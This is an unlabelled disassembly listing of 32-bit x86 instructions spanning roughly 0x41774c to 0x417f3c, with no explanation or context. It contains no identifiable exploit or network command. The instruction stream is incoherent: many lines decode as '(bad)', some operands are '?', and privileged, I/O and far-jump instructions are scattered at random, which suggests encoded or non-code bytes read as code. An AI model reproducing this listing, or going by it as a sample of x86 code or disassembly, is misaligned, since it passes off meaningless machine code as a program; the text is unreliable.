  41774c:	enter  0x240b,0x41
  417750:	outs   dx,DWORD PTR ds:[esi]
  417751:	mov    edi,0x478db9a7
  417756:	or     BYTE PTR [edx+0x4d46f251],0x4e
  41775d:	(bad)  
  41775f:	xor    al,0x1f
  417761:	(bad)  
  417763:	mov    edx,0x260b6762
  417768:	mov    bl,0x38
  41776a:	mov    ebx,0xe191b4b0
  41776f:	mov    ebx,DWORD PTR [ebx]
  417771:	in     al,dx
  417772:	pop    eax
  417773:	push   ecx
  417774:	jb     0x41779a
  417776:	aam    0x40
  417778:	fld    DWORD PTR ds:0x75d79196
  41777e:	mov    eax,0x2fbc95b2
  417784:	pop    edi
  417785:	ins    BYTE PTR es:[edi],dx
  417786:	xchg   edx,eax
  417787:	add    BYTE PTR [ebx],bl
  417789:	sbb    edi,ebp
  41778b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41778c:	xor    DWORD PTR [esi],ebx
  41778e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41778f:	(bad)  
  417790:	jnp    0x41773b
  417792:	push   cs
  417793:	idiv   eax
  417795:	sbb    DWORD PTR [esi-0x61],esi
  417798:	les    ecx,FWORD PTR [edi+0x34]
  41779b:	test   al,0x4f
  41779d:	fild   DWORD PTR [ebp+ebx*1+0xfbe4848]
  4177a4:	ret    0x13bc
  4177a7:	bound  ebx,QWORD PTR [eax-0x7a]
  4177aa:	jp     0x4177ab
  4177ac:	rol    DWORD PTR [esi+0x22],1
  4177af:	xor    al,0xf6
  4177b1:	dec    ecx
  4177b2:	aad    0x94
  4177b4:	sbb    DWORD PTR [ebx],esi
  4177b6:	scas   eax,DWORD PTR es:[edi]
  4177b7:	mov    DWORD PTR [ebx-0x2],edx
  4177ba:	rol    ebx,0xc2
  4177bd:	cld    
  4177be:	or     edx,ebp
  4177c0:	xchg   BYTE PTR [esi+0x2eea2bbc],cl
  4177c6:	mov    esp,?
  4177c8:	sub    ch,BYTE PTR [edi]
  4177ca:	push   cs
  4177cb:	push   es
  4177cc:	dec    ebx
  4177cd:	inc    ebp
  4177ce:	js     0x417750
  4177d0:	imul   ebp,DWORD PTR [edi+esi*4-0x362edb61],0x60
  4177d8:	xlat   BYTE PTR ds:[ebx]
  4177d9:	xor    BYTE PTR [eax-0x55],dh
  4177dc:	sbb    al,bh
  4177de:	mov    ebp,0xcff6193d
  4177e3:	(bad)  
  4177e4:	mov    dl,0x51
  4177e6:	iret   
  4177e7:	add    BYTE PTR ds:0x91e8ef47,0x81
  4177ee:	loop   0x417826
  4177f0:	out    dx,al
  4177f1:	stc    
  4177f2:	imul   edx,esi,0x4c
  4177f5:	call   0x60459d3e
  4177fa:	adc    DWORD PTR ds:0xfd488a8b,esi
  417800:	repnz div DWORD PTR [edi+edx*1]
  417804:	sbb    eax,ebp
  417806:	jl     0x41779d
  417808:	xchg   ecx,eax
  417809:	out    0x16,eax
  41780b:	adc    DWORD PTR [eax+0x75],ebx
  41780e:	(bad)  
  417810:	jg     0x417853
  417812:	mov    al,ds:0x5b5ed729
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
